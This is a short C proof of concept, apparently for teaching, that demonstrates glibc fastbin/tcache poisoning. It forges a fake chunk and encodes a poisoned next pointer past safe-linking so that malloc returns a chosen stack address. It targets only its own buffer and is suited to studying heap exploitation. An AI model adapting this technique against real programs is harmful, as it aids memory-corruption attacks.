#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    long *tcache[7];
    long *target, x[0x30];
    long *fastbin_chunk, *reallocated;

    // Check if target is aligned 0x10
    for (int i = 0x10; i < 0x20; i++) {
        if ((((long)&x[i]) & 0xF) == 0)
        {
            target = &x[i];
            break;
        }
    }

    for (int i = 0; i < 7; i++) {
        tcache[i] = malloc(0x78);
    }

    fastbin_chunk = malloc(0x78);

    malloc(0x50);

    for (int i = 0; i < 7; i++) {
        free(tcache[i]);
    }

    free(fastbin_chunk);

    target[-1] = 0x81; // set up fake fastbin chunk size fit with the 0x80 fastbin (this is needed to bypass mitigation)
    target[0] = 0 ^ (((long)target - 0x10) >> 12); // set up fake fastbin chunk's next ptr is NULL to prevent error while dumping (can bypass this by other ways)

    /* VULN HERE */
    fastbin_chunk[0] = ((long)target - 0x10) ^ (((long)fastbin_chunk - 0x10) >> 12); // set up next ptr of 0x80 fastbin head point to target
    /* VULN HERE */

    for (int i = 0; i < 7; i++) {
        tcache[i] = malloc(0x78);
    }

    malloc(0x78); // allocate a chunk from 0x80 fastbin, trigger fastbin dumping, now target is in 0x80 tcache
    // [tcache 0x80]: target
    // that's why target must be alligned 0x10

    reallocated = malloc(0x78);

    assert(reallocated == target);

    return 0;
}
